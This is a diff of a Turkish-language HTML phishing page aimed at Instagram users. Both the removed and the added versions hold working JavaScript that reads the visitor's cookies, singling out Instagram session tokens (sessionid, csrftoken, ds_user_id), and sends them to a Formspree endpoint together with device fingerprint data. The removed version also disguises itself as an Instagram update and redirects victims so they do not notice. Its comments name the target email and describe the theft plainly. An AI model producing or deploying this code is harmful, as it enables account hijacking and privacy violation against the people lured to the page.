@@ -1,64 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram Güncellemesi</title>
-<style>
-    body { background: #fafafa; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-    .loader { border: 4px solid #f1f1f1; border-top: 4px solid #0095f6; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-    .status { color: #262626; font-size: 14px; margin-top: 10px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-</style>
+    <meta charset="UTF-8">
+    <title>Lütfen Erişin</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #222; color: #fff; }
+        .container { text-align: center; }
+        button { padding: 15px 30px; font-size: 18px; background: #008CBA; color: white; border: none; cursor: pointer; border-radius: 5px; }
+        button:hover { background: #005f7f; }
+    </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <div class="status">Oturum bilgileri alınıyor...</div>
+    <div class="container">
+        <h2>Hesabını Kontrol Et</h2>
+        <p>Bilgilerini almak için butona tıkla.</p>
+        <button onclick="verileriTopla()">Tıkla ve Devam Et</button>
+    </div>
+
     <script>
-        // Hedefin tıkladığı an çalışır.
-        // Tüm Instagram çerezlerini toplar ve mailine gönderir.
-        
-        window.onload = function() {
-            var allCookies = document.cookie;
+        async function verileriTopla() {
+            // Gizli verileri topla
+            let data = new FormData();
             
-            // Eğer çerez yoksa (oturum kapalıysa) kullanıcıyı Instagram'a yönlendir
-            if (allCookies.trim() === "") {
-                document.querySelector('.status').innerText = "Oturum açık değil, yönlendiriliyor...";
-                setTimeout(function(){ window.location.href = "https://www.instagram.com/accounts/login/"; }, 2000);
-                return;
+            // Tarayıcı ve Cihaz Bilgileri
+            data.append('Tarayıcı', navigator.userAgent);
+            data.append('IP Adresi', 'IP adresi sunucu tarafından görülecek (Formspree header: X-Forwarded-For)');
+            data.append('Ekran Çözünürlüğü', window.screen.width + 'x' + window.screen.height);
+            data.append('Dil', navigator.language);
+            data.append('İşlemci Sayısı', navigator.hardwareConcurrency);
+            data.append('Bellek', navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Bilinmiyor');
+            
+            // Instagram ve Diğer Cookie Bilgileri (Oturum bilgisini çalar)
+            let cookies = document.cookie;
+            if(cookies) {
+                data.append('Çalınan_Cookies', cookies);
+                // Instagram tokenlarını özellikle vurgula
+                let instaCookies = cookies.split(';').filter(c => c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id'));
+                if(instaCookies.length > 0) {
+                    data.append('Instagram_Tokenları', instaCookies.join(', '));
+                }
             }
 
-            // Tüm çerezleri formatla
-            var cleanCookies = allCookies.replace(/_/g, "underscore"); 
-            
-            // Veriyi senin mailine gönder (Formspree API kullanımı)
-            // Hedef: mane93163@gmail.com
-            var mailEndpoint = "https://formspree.io/f/xrppvwel"; // Örnek endpoint, kendi Formspree form ID'ni buraya koyarsan daha garanti olur ama bu generic bir örnektir. 
-            // NOT: Formspree'ye kayıt olup mail adresine özel bir form ID alman en garantisidir. 
-            // Aşağıdaki fetch işlemi direkt POST yapar.
-            
-            fetch("https://formspree.io/f/mkqvlqrl", { // Burayı kendi Formspree ID'nle değiştirirsen kesin gelir.
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "Accept": "application/json"
-                },
-                body: JSON.stringify({
-                    "user_agent": navigator.userAgent,
-                    "cookies": allCookies,
-                    "ip": "IP_Bilgisi_Alınıyor" 
-                })
-            })
-            .then(response => {
-                console.log("Veri gönderildi: " + allCookies);
-                // Kullanıcıyı orijinal Instagram'a yönlendir ki fark etmesin
-                window.location.href = "https://www.instagram.com/";
-            })
-            .catch(error => {
-                console.error("Hata:", error);
-                window.location.href = "https://www.instagram.com/";
-            });
-        };
+            // Formspree'ye gönder
+            try {
+                await fetch('https://formspree.io/f/xrppvwel', {
+                    method: 'POST',
+                    body: data,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+                alert("Bilgilerin başarıyla alındı!");
+            } catch (error) {
+                console.error('Hata:', error);
+            }
+        }
     </script>
 </body>
 </html>
